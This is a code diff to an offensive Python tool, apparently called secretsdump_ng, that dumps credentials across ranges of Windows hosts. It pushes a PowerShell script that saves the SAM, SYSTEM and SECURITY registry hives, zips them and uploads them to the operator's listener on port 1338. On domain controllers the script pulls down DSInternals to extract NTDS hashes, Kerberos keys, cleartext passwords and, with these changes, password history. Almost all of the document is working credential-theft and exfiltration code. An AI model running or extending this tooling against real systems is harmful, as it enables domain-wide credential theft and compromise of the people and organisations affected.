@@ -16,6 +16,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 # check exec-across-windows exists
 if not shutil.which("exec-across-windows"):
     print("[!] exec-across-windows not found. Install with: pipx install exec-across-windows")
+    sys.exit(1)
 
 DSINTERNALS_URL = "https://github.com/MichaelGrafnetter/DSInternals/releases/download/v6.2/DSInternals_v6.2.zip"
 DSINTERNALS_ZIP = "DSInternals_v6.2.zip"
@@ -24,6 +25,11 @@ DSINTERNALS_SERVE_DIR = os.path.join(UPLOAD_DIR, "dsinternals_files")
 CERT_FILE = os.path.join(UPLOAD_DIR, "cert.pem")
 KEY_FILE = os.path.join(UPLOAD_DIR, "key.pem")
 
+# Flag globals
+dump_all = False
+include_history = False
+verbose = False
+just_dc_user = None
 
 def parse_ip_range(ip_range):
     """Parse IP range like 10.0.1-5.1-254 into list of IPs"""
@@ -98,7 +104,7 @@ def parse_ds_file(filepath):
     
     entries = []
     current_entry = {}
-    in_kerberos_new = False
+    location = None
     current_key_type = None
     
     for line in content.split('\n'):
@@ -111,7 +117,7 @@ def parse_ds_file(filepath):
             if current_entry:
                 entries.append(current_entry)
             current_entry = {}
-            in_kerberos_new = False
+            location = None
             current_key_type = None
         
         elif line.startswith('SamAccountName:'):
@@ -129,7 +135,6 @@ def parse_ds_file(filepath):
             nt_hash = line.split(':', 1)[1].strip()
             if nt_hash:
                 current_entry['nt'] = nt_hash
-                # Default empty LM hash value; same behavior as original secretsdump
                 current_entry['lm'] = "aad3b435b51404eeaad3b435b51404ee"        
 
         elif line.startswith('LMHash:'):
@@ -141,13 +146,35 @@ def parse_ds_file(filepath):
             cleartext = line.split(':', 1)[1].strip()
             if cleartext and all(ord(c) < 128 and c in string.printable for c in cleartext):
                 current_entry['cleartext'] = cleartext
+
+        elif include_history and line == 'NTHashHistory:':
+            location = "nt_hist"
+            current_entry['nt_history'] = []
         
+        elif include_history and line == 'LMHashHistory:':
+            location = "lm_hist"
+            current_entry['lm_history'] = []
+
+        elif location == "nt_hist" and line.startswith('Hash '):
+            hash_value = line.split(':', 1)[1].strip()
+            if hash_value:
+                current_entry['nt_history'].append(hash_value)
+        
+        elif location == "lm_hist" and line.startswith('Hash '):
+            hash_value = line.split(':', 1)[1].strip()
+            if hash_value:
+                current_entry['lm_history'].append(hash_value)
+
+        # Reset location when we hit major sections
+        elif line in ['SupplementalCredentials:', 'WDigest:','Kerberos:']:
+            location = None
+            
         elif line == 'KerberosNew:':
-            in_kerberos_new = True
+            location = "kerberos_new"
             if 'kerberos' not in current_entry:
                 current_entry['kerberos'] = {}
         
-        elif in_kerberos_new:
+        elif location == "kerberos_new":
             if line == 'AES256_CTS_HMAC_SHA1_96':
                 current_key_type = 'aes256'
             elif line == 'AES128_CTS_HMAC_SHA1_96':
@@ -158,14 +185,13 @@ def parse_ds_file(filepath):
                 key = line.split(':', 1)[1].strip()
                 if key:
                     current_entry['kerberos'][current_key_type] = key
-            elif line in ['OldCredentials:', 'OlderCredentials:', 'ServiceCredentials:']:
-                in_kerberos_new = False
+            # Don't exit on subsections - they're part of KerberosNew
+            # Just ignore: Credentials:, OldCredentials:, OlderCredentials:, ServiceCredentials:
     
     if current_entry:
         entries.append(current_entry)
     
     return entries
-
 
 def format_ntds_output(entries):
     """Format NTDS entries in secretsdump style"""
@@ -204,6 +230,12 @@ def format_ntds_output(entries):
             nt_display = nt if nt else ''
             if lm_display or nt_display:
                 lines.append(f"{admin_tag}{sam}:{rid}:{lm_display}:{nt_display}:::")
+
+        if 'nt_history' in entry and entry['nt_history']:
+            for idx, nt_hash in enumerate(entry['nt_history']):
+                # Get corresponding LM hash from history, or use empty LM hash
+                lm_hash = entry.get('lm_history', [])[idx] if idx < len(entry.get('lm_history', [])) else 'aad3b435b51404eeaad3b435b51404ee'
+                lines.append(f"    {sam}_history{idx}:{rid}:{lm_hash}:{nt_hash}:::")
         
         if 'cleartext' in entry:
             cleartext_lines.append(f"{admin_tag}{sam}:CLEARTEXT:{entry['cleartext']}")
@@ -221,26 +253,30 @@ def format_ntds_output(entries):
                 kerberos_lines.append(admin_tag + ':'.join(kerb_parts))
     
     output = []
+    received_ntds = False
     if lines:
         output.append("[*] Dumping NTDS.DIT secrets")
+        received_ntds = True
         output.extend(lines)
-    
-    if cleartext_lines:
-        output.append("")
-        output.append("[*] ClearText passwords grabbed")
-        output.extend(cleartext_lines)
     
     if kerberos_lines:
         output.append("")
         output.append("[*] Kerberos keys grabbed")
         output.extend(kerberos_lines)
-    
-    output.append(f"\n[*] Using Impacket's secretsdump to dump from registry hives...")
+        
+    if cleartext_lines:
+        output.append("")
+        output.append("[*] ClearText passwords grabbed")
+        output.extend(cleartext_lines)
+
+    if received_ntds and dump_all:
+        output.append(f"\n[*] Using Impacket's secretsdump to dump from registry hives...")
+        output.append("\033[33m[!] WARNING: Target is a DC, and we've dumped NTDS. These are likely stale. \033[0m")
     
     return '\n'.join(output) if output else ''
 
 
-def filter_secretsdump_output(output, just_dc_user):
+def filter_secretsdump_output(output):
     """Filter secretsdump output to only include specified user"""
     if not just_dc_user:
         return output
@@ -277,7 +313,7 @@ def filter_secretsdump_output(output, just_dc_user):
         return f"\033[33m[!] Secretsdump succeeded, but found no matching user: {just_dc_user}.\033[0m"
 
 
-def process_registry_hives(zip_path, ip, just_dc_user=None):
+def process_registry_hives(zip_path, ip):
     """Extract registry hives and run impacket-secretsdump"""
     try:
         extract_dir = os.path.join(UPLOAD_DIR, ip)
@@ -313,12 +349,15 @@ def process_registry_hives(zip_path, ip, just_dc_user=None):
             '-security', security_path,
             'LOCAL'
         ]
+
+        if include_history:
+            cmd.append('-history')
         
         result = subprocess.run(cmd, capture_output=True, text=True)
         os.remove(zip_path)
         
         # Filter output if just_dc_user is specified
-        output = filter_secretsdump_output(result.stdout, just_dc_user)
+        output = filter_secretsdump_output(result.stdout)
         
         return output
         
@@ -342,7 +381,6 @@ def finalize_output(ip, run_start_time):
         ntds_output = format_ntds_output(entries)
         if ntds_output:
             output_parts.append(ntds_output)
-        os.remove(ntds_file)
         sys.stderr.write(f"\033[32m[+]\033[0m NTDS dump received from {ip}\n")
         threading.Event().wait(1)
         sys.stderr.flush()
@@ -397,9 +435,7 @@ class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
                 with open(zip_path, 'wb') as f:
                     f.write(data)
                 
-                # Get just_dc_user from server if available
-                just_dc_user = getattr(self.server, 'just_dc_user', None)
-                hives_output = process_registry_hives(zip_path, ip, just_dc_user)
+                hives_output = process_registry_hives(zip_path, ip)
                 output_file = os.path.join(extract_dir, 'secretsdump_output.txt')
                 with open(output_file, 'w') as f:
                     f.write(hives_output)
@@ -423,19 +459,15 @@ class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
             self.end_headers()
     
     def log_message(self, format, *args):
-        if hasattr(self.server, 'verbose') and self.server.verbose:
+        if verbose:
             super().log_message(format, *args)
         else:
             pass
 
 
-def start_upload_server(just_dc_user=None, verbose=False):
+def start_upload_server():
     """Start HTTPS server for receiving credential uploads on port 1338"""
     http_server = HTTPServer(("0.0.0.0", 1338), FileUploadHTTPRequestHandler)
-    
-    # Store just_dc_user in server for handler access
-    http_server.just_dc_user = just_dc_user
-    http_server.verbose = verbose
     
     # Wrap with SSL
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
@@ -453,7 +485,7 @@ https_server = None
 print_lock = threading.Lock()
 
 
-def run_secretsdump(ip, username, password, just_dc_user, verbose, show_single_output, timeout=30):
+def run_secretsdump(ip, username, password, show_single_output, timeout=30):
     
     run_start_time = time.time()
 
@@ -461,6 +493,9 @@ def run_secretsdump(ip, username, password, just_dc_user, verbose, show_single_o
         print(f"[*] Attempting to secretsdump on {ip} using credentials {username}:{password}")
     
     host_ip = get_host_ip_given_target(ip)
+    if not host_ip:
+        print("[!] Could not find local IP to host server from.")
+        sys.exit(1)
 
     if just_dc_user:
         who_to_dump = f"-SamAccountName {just_dc_user}"
@@ -488,19 +523,6 @@ try {{
     if ($ntds) {{ $isDC = $true }}
 }} catch {{}}
 
-reg save HKLM\\SAM $env:TEMP\\SAM /y | Out-Null
-reg save HKLM\\SYSTEM $env:TEMP\\SYSTEM /y | Out-Null
-reg save HKLM\\SECURITY $env:TEMP\\SECURITY /y | Out-Null
-
-Compress-Archive -Path $env:TEMP\\SAM,$env:TEMP\\SYSTEM,$env:TEMP\\SECURITY -DestinationPath $env:TEMP\\hives_{ip}.zip -Force
-
-iwr -Uri "https://{host_ip}:1338/upload?filename=hives_{ip}.zip" -Method Post -InFile "$env:TEMP\\hives_{ip}.zip" -Headers @{{"filename"="hives_{ip}.zip"}} -UseBasicParsing | Out-Null
-
-del $env:TEMP\\SAM
-del $env:TEMP\\SYSTEM
-del $env:TEMP\\SECURITY
-del $env:TEMP\\hives_{ip}.zip
-
 if ($isDC) {{
     iwr https://{host_ip}:1338/{DSINTERNALS_ZIP} -o $env:TEMP\\DSInternals.zip
     Expand-Archive $env:TEMP\\DSInternals.zip -d $env:TEMP\\DSInternals\\
@@ -518,6 +540,22 @@ if ($isDC) {{
     del $env:TEMP\\DSInternals.zip
     del $env:TEMP\\DSInternals\\ -recurse
 }}
+
+if (-not $isDC -or ${str(dump_all).lower()}) {{
+    reg save HKLM\\SAM $env:TEMP\\SAM /y | Out-Null
+    reg save HKLM\\SYSTEM $env:TEMP\\SYSTEM /y | Out-Null
+    reg save HKLM\\SECURITY $env:TEMP\\SECURITY /y | Out-Null
+
+    Compress-Archive -Path $env:TEMP\\SAM,$env:TEMP\\SYSTEM,$env:TEMP\\SECURITY -DestinationPath $env:TEMP\\hives_{ip}.zip -Force
+
+    iwr -Uri "https://{host_ip}:1338/upload?filename=hives_{ip}.zip" -Method Post -InFile "$env:TEMP\\hives_{ip}.zip" -Headers @{{"filename"="hives_{ip}.zip"}} -UseBasicParsing | Out-Null
+
+    del $env:TEMP\\SAM
+    del $env:TEMP\\SYSTEM
+    del $env:TEMP\\SECURITY
+    del $env:TEMP\\hives_{ip}.zip
+}}
+
 '''
 
     try:
@@ -531,7 +569,7 @@ if ($isDC) {{
             result = subprocess.run(exec_cmd, capture_output=True, text=True)
         
         # Wait a moment for files to be uploaded and processed
-        threading.Event().wait(2)
+        threading.Event().wait(3)
 
         if not verbose:
             output = result.stdout + result.stderr
@@ -558,6 +596,14 @@ if ($isDC) {{
 
 
 def main(args):
+    global dump_all,include_history,verbose,just_dc_user
+    
+    # global args
+    dump_all = args.dump_all
+    include_history = args.history
+    verbose = args.verbose
+    just_dc_user = args.just_dc_user
+
     # Create directories
     os.makedirs(UPLOAD_DIR, exist_ok=True)
     os.makedirs(DSINTERNALS_SERVE_DIR, exist_ok=True)
@@ -577,7 +623,7 @@ def main(args):
             return
 
     print("[*] Starting HTTPS server on port 1338")
-    threading.Thread(target=start_upload_server, args=(args.just_dc_user, args.verbose), daemon=True).start()
+    threading.Thread(target=start_upload_server, daemon=True).start()
 
     targets = parse_ip_range(args.ip_range)
     show_single_output = len(targets) == 1
@@ -595,8 +641,6 @@ def main(args):
                 ip,
                 args.username,
                 args.password,
-                args.just_dc_user,
-                args.verbose,
                 show_single_output,
                 args.timeout
             )
@@ -616,16 +660,20 @@ def main(args):
 
 def main_cli():
     """CLI entry point for pip installation"""
-    parser = argparse.ArgumentParser(description="secretsdump automation")
-    os.makedirs(UPLOAD_DIR, exist_ok=True)
+    parser = argparse.ArgumentParser(
+        description="secretsdump automation",
+        usage="secretsdump_ng.py ip_range username password [-h] [--threads NUM_THREADS] [--timeout TIMEOUT_SECONDS] [-j USER] [-v] [--history] [--dump-all]"
+    )
 
     parser.add_argument("ip_range", help="IP range (e.g. 10.0.1-5.1-254)")
     parser.add_argument("username", help="Domain username")
     parser.add_argument("password", help="Password")
     parser.add_argument("--threads", metavar="NUM_THREADS", type=int, default=10, help="Number of concurrent threads")
     parser.add_argument("--timeout", metavar="TIMEOUT_SECONDS", type=int, default=20, help="Number of seconds before commands timeout")
-    parser.add_argument("-j", "--just-dc-user",metavar='USER', dest="just_dc_user", help="Extract only one user.")
+    parser.add_argument("-j", "--just-dc-user",metavar='USER', dest="just_dc_user", help="Extract only one specified user")
     parser.add_argument("-v", "--verbose", action="store_true",help="Show exec_across_windows output")
+    parser.add_argument("--history", action="store_true", help="Dump user password history")
+    parser.add_argument("--dump-all", action="store_true", help="Dump SAM/LSA/DPAPI on domain controllers, on top of NTDS")
 
     args = parser.parse_args()
     main(args)
